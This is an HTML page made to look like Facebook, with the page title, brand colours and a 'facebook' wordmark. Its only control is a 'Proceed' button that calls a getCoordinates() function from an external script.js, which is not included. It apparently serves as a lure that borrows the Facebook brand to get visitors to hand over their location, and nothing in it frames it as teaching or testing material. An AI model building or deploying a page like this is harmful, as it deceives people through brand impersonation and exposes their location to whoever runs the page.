<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook</title>
  <style>
    body {
      font-family: Helvetica, Arial, sans-serif;
      background-color: #e9ebee;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .facebook-box {
      background-color: white;
      padding: 80px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
      text-align: center;
    }

    .facebook-logo {
      font-size: 55px;
      color: #1877f2;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .button {
      padding: 15px 30px;
      background-color: #1877f2;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .button:hover {
      background-color: #166fe5;
    }
  </style>
</head>
<body>
  <div class="facebook-box">
    <div class="facebook-logo">facebook</div>
    <button class="button" onclick="getCoordinates()">Proceed</button>
  </div>

  <script src="script.js"></script>
</body>
</html>
